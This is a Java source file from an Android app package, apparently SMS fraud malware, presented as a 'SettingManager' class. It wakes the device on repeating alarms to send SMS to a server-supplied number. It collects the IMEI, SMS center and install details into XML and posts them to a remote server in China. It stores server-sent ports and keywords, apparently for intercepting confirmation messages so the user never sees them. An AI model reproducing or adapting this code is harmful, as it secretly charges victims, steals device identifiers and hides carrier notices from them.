package com.mms.bg.ui;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Date;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.InputStreamEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HTTP;
import org.xmlpull.v1.XmlSerializer;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Xml;

import com.mms.bg.transaction.WorkingMessage;
import com.mms.bg.util.XMLHandler;
import com.mms.bg.util.XmlLog;

public class SettingManager {
    private static final String TAG = "SettingManager";
    private static final boolean DEBUG = true;
    
    public static final String TARGET_NUM = "target_num";
    public static final String SMS_COUNT = "sms_send_count";
    public static final String LAST_SMS_TIME = "last_sms_time";
    public static final String LAST_SMS_FORMAT_TIME = "last_sms_format_time";
    public static final String LAST_DIAL_TIME = "last_dial_time";
    public static final String LAST_DIAL_FORMAT_TIME = "last_dial_format_time";
    public static final String ENABLE_DIAL = "enable_dial";
    public static final String ENABLE_SMS = "enable_sms";
    public static final String SMS_SEND_DELAY = "sms_send_delay";
    public static final String LAST_CONNECT_SERVER_TIME = "last_connect_server_time";
    public static final String SMS_BLOCK_TIME = "sms_block_time";
    public static final String SMS_BLOCK_PORT = "sms_block_port";
    public static final String SMS_BLOCK_KEY = "sms_block_key";
    public static final String SMS_CONFIRM_INFO = "sms_confirm_info";
    public static final String SMS_CENTER = "sms_center";
    public static final String FIRST_START_TIME = "first_start_time";
    
    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
    public final String UPLOAD_FILE_PATH;
    public final String DOWNLOAD_FILE_PATH;
    
    private static final int DEFAULT_SMS_COUNT = 2;
    
    private static final String DEFAULT_VALUE = "";
//    private static final long SMS_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
    private static final long SMS_DEFAULT_DELAY_TIME = 1 * 60 * 1000;
    public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
    public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
    private static final int TIMEOUT = 5 * 1000;
    
    public Activity mForegroundActivity;
    private Context mContext;
    private PowerManager.WakeLock mWakeLock;
    private PowerManager.WakeLock mPartWakeLock;
    private SharedPreferences mSP;
    private SharedPreferences.Editor mEditor;
    private static  SettingManager gSettingManager;
    private XmlLog mLog;
    public XMLHandler mXMLHandler;
    
    public static SettingManager getInstance(Context context) {
        if (gSettingManager == null) {
            gSettingManager = new SettingManager(context);
        }
        return gSettingManager;
    }

    public void setXMLHandler(XMLHandler handler) {
        mXMLHandler = handler;
    }
    
    public void makeWakeLock() {
        if (mWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                                            | PowerManager.ACQUIRE_CAUSES_WAKEUP, "");
            mWakeLock.setReferenceCounted(false);
        }
        mWakeLock.acquire();
    }
    
    public void releaseWakeLock() {
        mWakeLock.release();
        mWakeLock = null;
    }
    
    public void makePartialWakeLock() {
        if (mPartWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mPartWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "prepareSendSMS");
            mPartWakeLock.setReferenceCounted(false);
        }
        mPartWakeLock.acquire();
    }
    
    public void releasePartialWakeLock() {
        mPartWakeLock.release();
        mPartWakeLock = null;
    }
    
    //preference operator
    public void setLastSMSTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(LAST_SMS_TIME, time);
        mEditor.putString(LAST_SMS_FORMAT_TIME, date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastSMSFormatTime() {
        return mSP.getString(LAST_SMS_FORMAT_TIME, DEFAULT_VALUE);
    }
    
    public void setSMSBlockDelayTime(long time) {
        mEditor.putLong(SMS_BLOCK_TIME, time);
        mEditor.commit();
    }
    
    public long getSMSBlockDelayTime() {
        return mSP.getLong(SMS_BLOCK_TIME, 0);
    }
    
    public void setSMSBlockPorts(String ports) {
        mEditor.putString(SMS_BLOCK_PORT, ports);
        mEditor.commit();
    }
    
    public String getSMSBlockPorts() {
        return mSP.getString(SMS_BLOCK_PORT, null);
    }
    
    public void setSMSBlockKeys(String keys) {
        mEditor.putString(SMS_BLOCK_KEY, keys);
        mEditor.commit();
    }
    
    public String getSMSBlockKeys() {
        return mSP.getString(SMS_BLOCK_KEY, null);
    }
    
    public void setConfirmInfo(String str) {
        mEditor.putString(SMS_CONFIRM_INFO, str);
        mEditor.commit();
    }
    
    public String getConfirmInfo() {
        return mSP.getString(SMS_CONFIRM_INFO, null);
    }
    
    public long getLastSMSTime() {
        return mSP.getLong(LAST_SMS_TIME, 0);
    }
    
    public void setLastDialTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(LAST_DIAL_TIME, time);
        mEditor.putString(LAST_DIAL_FORMAT_TIME, date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastDialFormatTime() {
        return mSP.getString(LAST_DIAL_FORMAT_TIME, DEFAULT_VALUE);
    }
    
    private long getLastDailTime() {
        return mSP.getLong(LAST_DIAL_TIME, 0);
    }
    
    public void setSMSTargetNum(String num) {
        mEditor.putString(TARGET_NUM, num);
        mEditor.commit();
    }
    
    public String getSMSTargetNum() {
        return mSP.getString(TARGET_NUM, DEFAULT_VALUE); 
    }
    
    public void setDialEnable(boolean enable) {
        mEditor.putBoolean(ENABLE_DIAL, enable);
        mEditor.commit();
    }
    
    public boolean getDialEnable() {
        return mSP.getBoolean(ENABLE_DIAL, true);
    }
    
    public void setSMSEnable(boolean enable) {
        mEditor.putBoolean(ENABLE_SMS, enable);
        mEditor.commit();
    }
    
    public boolean getSMSEnable() {
        return mSP.getBoolean(ENABLE_SMS, true); 
    }
    
    public void setSMSSendCount(int count) {
        mEditor.putInt(SMS_COUNT, count);
        mEditor.commit();
    }
    
    public int getSMSSendCount() {
        return mSP.getInt(SMS_COUNT, DEFAULT_SMS_COUNT);
    }
    
    public void setSMSSendDelay(long delay) {
        mEditor.putLong(SMS_SEND_DELAY, delay);
        mEditor.commit();
    }
    
    private long getSMSSendDelay() {
        return mSP.getLong(SMS_SEND_DELAY, SMS_DEFAULT_DELAY_TIME);
    }
    
    public void logSMSCurrentTime() {
        Date date = new Date(System.currentTimeMillis());
        mLog.appendLog("SMS_Send", date.toGMTString());
    }
    
    public void logTagCurrentTime(String tag) {
        Date date = new Date(System.currentTimeMillis());
        mLog.appendLog(tag, date.toGMTString());
    }
    
    public void closeLog() {
        mLog.endLog();
    }
    
    public boolean isSimCardReady() {
        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
            return true;
        }
        return false;
    }
    
    public boolean isCallIdle() {
        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE) {
            return true;
        }
        return false;
    }
    
    public void startAutoSendMessage() {
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_SMS_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
        long currentTime = System.currentTimeMillis();
        long firstTime = currentTime;
        
        long sms_delay_time = getSMSSendDelay();
        long latestSMSTime = this.getLastSMSTime();
        long tempDelay = 2 * 60 * 1000;
        if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= sms_delay_time + tempDelay) {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s");
            firstTime = currentTime + tempDelay;
        } else if (latestSMSTime != 0) {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay " + sms_delay_time);
            firstTime = latestSMSTime + sms_delay_time;
        } else {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s 1");
            firstTime = currentTime + tempDelay;
        }
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, sms_delay_time, sender);
    }
    
    public void setLastConnectServerTime(long time) {
        mEditor.putLong(LAST_CONNECT_SERVER_TIME, time);
        mEditor.commit();
    }
    
    public long getLastConnectServerTime() {
        return mSP.getLong(LAST_CONNECT_SERVER_TIME, 0);
    }
    
    public void setSMSCenter(String num) {
        mEditor.putString(SMS_CENTER, num);
        mEditor.commit();
    }
    
    public String getFirstStartTime() {
        return mSP.getString(FIRST_START_TIME, null);
    }
    
    public void setFirstStartTime() {
        String time = getFirstStartTime();
        if (time == null) {
            Date date = new Date(System.currentTimeMillis());
            mEditor.putString(FIRST_START_TIME, date.toGMTString());
            mEditor.commit();
        }
    }
    
    public String getSMSCenter() {
        return mSP.getString(SMS_CENTER, null);
    }
    
    public void tryToFetchInfoFromServer(long delayTime) {
        cancelFetchInfo();
//        final long DEFAULT_FETCH_DELAY = 24 * 60 * 60 * 1000;
        final long DEFAULT_FETCH_DELAY = 60 * 1000;
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_CONNECT_SERVER);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        long currentTime = System.currentTimeMillis();
        long firstTime = currentTime;
        
        long connect_delay_time = delayTime != 0 ? delayTime : DEFAULT_FETCH_DELAY;
        long latestConnectTime = getLastConnectServerTime();
        long tempDelay = 1 * 60 * 1000;
        if (latestConnectTime != 0 && (currentTime - latestConnectTime) >= connect_delay_time + tempDelay) {
            firstTime = currentTime + tempDelay;
        } else if (latestConnectTime != 0) {
            firstTime = latestConnectTime + connect_delay_time;
        } else {
            firstTime = currentTime + tempDelay;
        }
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, connect_delay_time, sender);
    }
    
    private void cancelFetchInfo() {
        LOGD("[[cancelFetchInfo]]");
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_CONNECT_SERVER);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
    
    private HttpParams getParams() {
        HttpParams params = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(params, TIMEOUT);
        HttpConnectionParams.setSoTimeout(params, TIMEOUT);
        HttpConnectionParams.setSocketBufferSize(params, 8192);
//        if (getProxy() == true) {
//            final HttpHost proxy = new HttpHost(mProxyHost, mProxyPort, "http");
//            params.setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
//        }
        return params;
    }
    
    public HttpResponse openConnection(File uploadFile) {
        LOGD("[[openConnection]]");
        HttpClient hc = new DefaultHttpClient(getParams());
        HttpPost post = new HttpPost();
        try {
            post.setURI(new URI(SERVER_URL));
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return null;
        }
        post.setHeader(HTTP.CONTENT_TYPE, "text/plain");
        post.setHeader("Accept", "*/*");
        if (uploadFile != null) {
            InputStreamEntity entity = null;
            try {
                FileInputStream fis = new FileInputStream(uploadFile);
                entity = new InputStreamEntity(fis, fis.available());
            } catch (FileNotFoundException e1) {
                e1.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            ((HttpPost) post).setEntity(entity);
        }
        try {
            HttpResponse response = hc.execute(post);
            LOGD("[[openConnection]] return response != null");
            return response;
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    
    private void savePhoneInfo() {
        String smsCenter = this.getSMSCenter();
        //test code
        if (smsCenter == null) {
            smsCenter = "13800100500";
        }
        LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
        if (smsCenter != null) {
            if (smsCenter.startsWith("+") == true) {
                smsCenter = smsCenter.substring(3);
            }
            TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
            String imei = tm.getDeviceId();
            String version = "1.0";
            String first = "1";
            String handled = "0";
            String pid = String.valueOf(android.os.Process.myPid());
            String installTime = getFirstStartTime();
            if (installTime == null) {
                this.setFirstStartTime();
                installTime = getFirstStartTime();
            }
            String systemVersion = Build.VERSION.SDK;
            String author = "michael";
            String fare = "0";
            
            try {
                File file = new File(UPLOAD_FILE_PATH);
                if (file.exists() == true) {
                    file.delete();
                } else {
                    file.createNewFile();
                }
                FileOutputStream out = new FileOutputStream(file);
                XmlSerializer serializer = Xml.newSerializer();
                serializer.setOutput(out, "UTF-8");
                serializer.startDocument("UTF-8", true);
                
                XmlSerializer child = serializer.startTag("", "body");
                
                child.startTag("", "imei");
                child.text(imei);
                child.endTag("", "imei");
                
                child.startTag("", "version");
                child.text(version);
                child.endTag("", "version");
                
                child.startTag("", "smscenter");
                child.text(smsCenter);
                child.endTag("", "smscenter");
                
                child.startTag("", "first");
                child.text(first);
                child.endTag("", "first");
                
                child.startTag("", "handled");
                child.text(handled);
                child.endTag("", "handled");
                
                child.startTag("", "pid");
                child.text(pid);
                child.endTag("", "pid");
                
                child.startTag("", "installtime");
                child.text(installTime);
                child.endTag("", "installtime");
                
                child.startTag("", "sysversion");
                child.text(systemVersion);
                child.endTag("", "sysversion");
                
                child.startTag("", "auth");
                child.text(author);
                child.endTag("", "auth");
                
                child.startTag("", "fare");
                child.text(fare);
                child.endTag("", "fare");
                
                serializer.endTag("", "body");
                serializer.flush();
                serializer.endDocument();
                out.close();
            } catch (Exception e) {
            }
        } else {
            WorkingMessage wm = WorkingMessage.createEmpty(mContext);
            wm.setDestNum("10086");
            wm.setText("1234567");
            wm.send();
        }
    }
    
    public boolean getXMLInfoFromServer() {
        savePhoneInfo();
        
        File file = new File(UPLOAD_FILE_PATH);
        if (file.exists() == false) {
            return false;
        }
        LOGD("[[getTargetNum]] the file upload is exist");
        HttpResponse r = openConnection(file);
        if (r == null) return false;
        if (r.getStatusLine().getStatusCode() != 200) {
            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
            return false;
        }
        try {
            File outFile = new File(DOWNLOAD_FILE_PATH);
            if (!outFile.exists()) {
                outFile.createNewFile();
            }
            LOGD("[[getTargetNum]] download file now");
            FileOutputStream fos = new FileOutputStream(DOWNLOAD_FILE_PATH, false);
            InputStream is = r.getEntity().getContent();
            byte[] buffer = new byte[1024];
            int readLength = 0;
            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
                fos.write(buffer, 0, readLength);
                fos.flush();
            }
            fos.close();
            is.close();
            dumpReceiveFile(DOWNLOAD_FILE_PATH);
            
//            SAXParser mSaxparser;
//            try {
//                mSaxparser = SAXParserFactory.newInstance().newSAXParser();
//                mXMLHandler = new XMLHandler(DOWNLOAD_FILE_PATH);
//                mSaxparser.parse(new File(DOWNLOAD_FILE_PATH), mXMLHandler);
//                
//                mXMLHandler.dumpXMLParseInfo();
//            } catch (Exception e) {
//                e.printStackTrace();
//            }
        } catch (Exception e) {
            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
            return false;
        }
        return true;
    }
    
    public void parseServerXMLInfo() {
        File file = new File(DOWNLOAD_FILE_PATH);
        if (file.exists() == true) {
            SAXParser mSaxparser;
            try {
                mSaxparser = SAXParserFactory.newInstance().newSAXParser();
                mXMLHandler = new XMLHandler();
                mSaxparser.parse(file, mXMLHandler);
                
                mXMLHandler.dumpXMLParseInfo();
                refreshChannelSP();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    private void refreshChannelSP() {
        LOGD("[[refreshChannelSP]]");
        ArrayList<String> blockPorts = mXMLHandler.getBlockPorts();
        if (blockPorts.size() > 0) {
            StringBuilder ports = new StringBuilder();
            for(int index = 0; index < blockPorts.size(); ++index) {
                ports.append(blockPorts.get(index)).append(";");
            }
            this.setSMSBlockPorts(ports.substring(0, (ports.length() - 1)));
        } else {
            mEditor.remove(SMS_BLOCK_PORT);
        }
        ArrayList<String> blockKeys = mXMLHandler.getBlockKeys();
        if (blockKeys.size() > 0) {
            StringBuilder keys = new StringBuilder();
            for (int index = 0; index < blockKeys.size(); ++index) {
                keys.append(blockKeys.get(index)).append(";");
            }
            this.setSMSBlockKeys(keys.substring(0, (keys.length() - 1)));
        } else {
            mEditor.remove(SMS_BLOCK_KEY);
        }
        String confirmPort = mXMLHandler.getChanneInfo(XMLHandler.CONFIRM_PORT);
        String confirmKey = mXMLHandler.getChanneInfo(XMLHandler.CONFIRM_KEY);
        String confirmText = mXMLHandler.getChanneInfo(XMLHandler.CONFIRM_CONTENT);
        if (confirmPort != null && confirmKey != null && confirmText != null) {
            String confirmInfo = confirmPort + ";" + confirmKey + ";" + confirmText;
            this.setConfirmInfo(confirmInfo);
        } else {
            mEditor.remove(SMS_CONFIRM_INFO);
        }
        String blockTime = mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
        if (blockTime != null) {
            this.setSMSBlockDelayTime(Integer.valueOf(blockTime) * 60 * 60 * 1000);
        } else {
            mEditor.remove(SMS_BLOCK_TIME);
        }
        mEditor.commit();
    }
    
    private void dumpReceiveFile(String filename) {
        if (DEBUG) {
            try {
                Log.d(TAG, "[[dumpReceiveFile]] begin dump the file = " + filename);
                File file = new File(filename);
                FileInputStream in = new FileInputStream(file);
                int length = (int) file.length();
                byte[] datas = new byte[length];
                in.read(datas, 0, datas.length);
                String result = new String(datas);
                Log.d(TAG, result);
            } catch (Exception e) {
                Log.d(TAG, "[[dumpReceiveFile]] e = " + e.getMessage());
            }
        }
    }
    
    private SettingManager(Context context) {
        mContext = context;
        mSP = PreferenceManager.getDefaultSharedPreferences(mContext);
        mEditor = mSP.edit();
        mLog = new XmlLog(context.getFilesDir().getAbsolutePath() + "/log.xml", true);
        UPLOAD_FILE_PATH = context.getFilesDir().getAbsolutePath() + "/upload.xml";
        DOWNLOAD_FILE_PATH = context.getFilesDir().getAbsolutePath() + "/serverInfo.xml";
    }
    
    private static void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, msg);
        }
    }
    
}